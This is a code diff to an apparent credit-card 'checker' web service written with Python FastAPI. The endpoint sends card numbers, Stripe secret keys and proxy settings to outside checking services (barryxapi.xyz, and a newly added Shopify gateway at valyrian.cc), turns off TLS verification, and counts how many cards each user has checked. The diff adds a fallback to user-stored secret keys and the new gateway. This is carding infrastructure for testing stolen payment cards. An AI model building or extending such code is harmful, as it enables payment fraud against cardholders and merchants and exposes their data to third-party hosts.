@@ -372,7 +372,9 @@ async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user
                 if not target_sk:
                     return {"status": False, "message": "Admin has not configured a global Secret Key"}
             elif not target_sk:
-                return {"status": False, "message": "Missing Secret Key"}
+                target_sk = user.get("stripe_sk")
+                if not target_sk:
+                    return {"status": False, "message": "Missing Secret Key. Please configure it in settings or provide it."}
                 
             url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={target_sk}&proxy={proxy_url}"
             res = requests.get(url, timeout=20.0, verify=False)
@@ -402,6 +404,14 @@ async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user
                 "proxy": proxy_url
             }
             res = requests.post("https://api.barryxapi.xyz/auto_sh", json=payload, timeout=20.0, verify=False)
+            data = res.json()
+            
+            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
+            return data
+            
+        elif req.gateway == "shopify_v2":
+            url = f"https://gates.valyrian.cc/autoshopify/tsl/check?card={req.card}&proxy={proxy_url}"
+            res = requests.get(url, timeout=30.0, verify=False)
             data = res.json()
             
             await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
